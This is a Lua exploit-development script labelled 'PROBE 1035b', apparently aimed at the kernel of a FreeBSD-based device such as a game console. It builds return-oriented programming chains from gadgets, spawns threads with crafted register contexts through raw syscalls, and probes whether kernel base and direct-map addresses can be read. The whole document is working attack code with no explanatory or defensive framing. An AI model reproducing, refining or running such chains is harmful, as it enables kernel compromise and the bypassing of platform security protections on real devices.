-- CRASH_CLASS: HIGH
-- PROBE 1035b: data-read chain with an explicit thr_exit tail (no spinning children).
-- A read of a supervisor page faults; a read of a user-accessible page stores the value.
print("=== PROBE 1035b ===")
local function to_num(v)
  if type(v)=="table" and v.tonumber then return v:tonumber() end
  if type(v)=="table" and v.h then return v.h*4294967296+v.l end
  return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end return -1 end
local function A(x) local ok,v=pcall(function() return as_addr(x) end) if ok and v and v>0 then return v end return 0 end
local ph=gadgets.stack_pivot[1]; local ctxt=memory.alloc(8)
local hc=ropchain({stack_base=to_num(ph.pivot_addr)})
hc:push_store_rdx_into_memory(ctxt)
hc:push_syscall_raw(syscall.write,function()
  hc:push_set_rdx(0x40); hc:push_set_rax_from_memory(ctxt); hc:push_add_to_rax(0x100)
  hc:push_set_reg_from_rax("rsi"); hc:push_set_reg_from_memory("rdi",signal.fd_addr) end)
hc:push_syscall_raw(mk(431),function() hc:push_set_rdi(0) end)
local pop_rax=A(gadgets["pop rax; ret"]); local ld_rax=A(gadgets["mov rax, [rax]; ret"])
local pop_rdi=A(gadgets["pop rdi; ret"]);  local st_rdi=A(gadgets["mov [rdi], rax; ret"])
local fn=to_num(syscall.pipe.fn_addr)
print(string.format("[1] pop_rax=%X ld=%X pop_rdi=%X st=%X fn=%X",pop_rax,ld_rax,pop_rdi,st_rdi,fn))
local page=0x4000
local function mmap(px)
  local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
  local v=to_num(a); if v~=0 and v<0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end; return v
end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100}
local ctx=memory.alloc(0x500); local tb=memory.alloc(8); local ts=memory.alloc(16); local ctxa=as_addr(ctx)
local function scan(tag,target,out)
  local stack=mmap(page)
  local ch={target,ld_rax,pop_rdi,out,st_rdi,pop_rax,431,fn}
  for k=1,#ch do wq(stack+(k-1)*8,ch[k]) end
  wq(out,0xDEADBEEF)
  for o=0,0x4F8,8 do wq(ctxa+o,0) end
  wq(ctxa+Ctx.MAGIC,0x480); wq(ctxa+Ctx.TYPE,0x10000); wq(ctxa+Ctx.CS,0x43); wq(ctxa+Ctx.SS,0x3B)
  wq(ctxa+Ctx.RIP,pop_rax); wq(ctxa+Ctx.RSP,stack)
  wq(as_addr(tb),0)
  local ok,rv=pcall(function() return mk(430)(uint64(ctxa),uint64(as_addr(tb)),uint64(0)) end)
  wq(as_addr(ts),0); wq(as_addr(ts)+8,30000)
  pcall(function() return mk(468)(uint64(as_addr(ts)),uint64(0)) end)
  print(string.format("[%s] tgt=%X spawn=%s out=%X%X", tag, target, ok and string.format("%s",rv) or "FI", rd(out+4), rd(out)))
end
local out=mmap(page)
local src=mmap(page); wq(src,0x1122334455667788)
print(string.format("[2] out=%X src=%X srcval=%X%X", out, src, rd(src+4), rd(src)))
scan("CTRL-USER", src, out)
scan("K-BASE", 0xFFFFFFFFD8000000, out)
scan("K+2M", 0xFFFFFFFFD8200000, out)
scan("K+16M", 0xFFFFFFFFD9000000, out)
scan("DMAP", 0xFFFF800000000000, out)
print("[Z] alive")
